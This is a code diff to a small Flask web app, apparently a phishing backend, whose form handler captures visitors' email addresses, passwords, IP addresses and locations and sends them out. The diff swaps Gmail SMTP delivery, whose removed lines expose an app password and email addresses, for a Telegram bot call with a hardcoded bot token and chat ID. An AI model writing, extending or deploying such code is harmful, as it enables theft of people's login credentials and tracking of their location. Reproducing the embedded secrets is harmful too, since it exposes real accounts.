@@ -5,10 +5,18 @@ import requests
 
 app = Flask(__name__)
 
-SENDER_EMAIL = "wayraeric78@gmail.com"       
-RECEIVER_EMAIL = "igwesomtochukwu@gmail.com"     
-APP_PASSWORD = "zxqbinxnxqcwizzp"  
+BOT_TOKEN = "8382564029:AAE6-xBKMU3oguhnYWb51hZ65oYryLKhzWM"
+CHAT_ID = "8150747146"
 
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+    data = {
+        "chat_id": CHAT_ID,
+        "text": message
+    }
+
+    requests.post(url, data=data)
 
 @app.route("/")
 def home():
@@ -31,29 +39,17 @@ def submit():
     except:
         location = "Unknown"
 
-    msg_body = f"""
+    message = f"""
     Email: {email}
     Password: {password}
     IP Address: {user_ip}
     Location: {location}
     """
 
-    msg = MIMEText(msg_body)
-    msg["Subject"] = "New Form Submission"
-    msg["From"] = SENDER_EMAIL
-    msg["To"] = RECEIVER_EMAIL
+    send_to_telegram(message)
 
-    try:
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(SENDER_EMAIL, APP_PASSWORD)
-        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
-        server.quit()
+    return jsonify({"status": "success"})
 
-        return jsonify({"status": "success"})
-    except Exception as e:
-        print("Error sending email:", e)
-        return jsonify({"status": "error", "message": str(e)})
 
 
 if __name__ == "__main__":
